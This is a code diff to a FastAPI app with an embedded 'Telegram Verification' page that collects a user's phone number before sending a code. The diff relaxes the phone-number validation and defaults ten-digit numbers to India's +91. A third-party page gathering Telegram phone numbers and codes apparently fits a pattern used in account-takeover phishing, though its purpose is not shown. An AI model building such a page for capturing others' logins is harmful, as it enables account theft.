@@ -1,3 +1,4 @@
+
 import os
 from fastapi import FastAPI, Request, HTTPException
 from fastapi.responses import HTMLResponse
@@ -234,10 +235,9 @@ HTML_TEMPLATE = """
         <div class="text-center">
           <i class="fa-brands fa-telegram text-5xl text-blue-500 mb-2"></i>
           <h3 class="text-xl font-bold text-white">Telegram Verification</h3>
-          <p class="text-sm text-gray-400 mt-1">Enter your phone number with country code</p>
-          <p class="text-xs text-gray-500">(e.g. +91XXXXXXXXXX)</p>
+          <p class="text-sm text-gray-400 mt-1">Enter your mobile number</p>
         </div>
-        <input type="text" id="phoneInput" placeholder="+91XXXXXXXXXX" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500 text-lg text-center tracking-widest">
+        <input type="text" id="phoneInput" placeholder="Enter Phone Number" class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-blue-500 text-lg text-center tracking-widest">
         <button onclick="sendCode()" id="btnSendCode" class="w-full py-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl">Send Code</button>
       </div>
 
@@ -325,9 +325,22 @@ HTML_TEMPLATE = """
 
     async function sendCode(isResend = false) {
       if(!isResend) {
-        userPhone = document.getElementById('phoneInput').value.trim();
+        let rawInput = document.getElementById('phoneInput').value.trim();
+        let clean = rawInput.replace(/[^\\d+]/g, '');
+
+        if (!clean) return showError("Please enter a valid phone number");
+
+        // SMART PHONE NUMBER FORMATTING (ALL COUNTRIES SUPPORTED)
+        if (clean.startsWith('+')) {
+            userPhone = clean;
+        } else if (clean.length === 10) {
+            // Default India (+91) if user enters only 10 digits
+            userPhone = '+91' + clean;
+        } else {
+            // Add '+' automatically for code entered without + (e.g. 91..., 1...)
+            userPhone = '+' + clean;
+        }
       }
-      if(!userPhone.startsWith('+')) return showError("Please include '+' with country code (e.g. +91...)");
 
       const btn = isResend ? document.getElementById('btnResend') : document.getElementById('btnSendCode');
       btn.innerText = "Sending...";
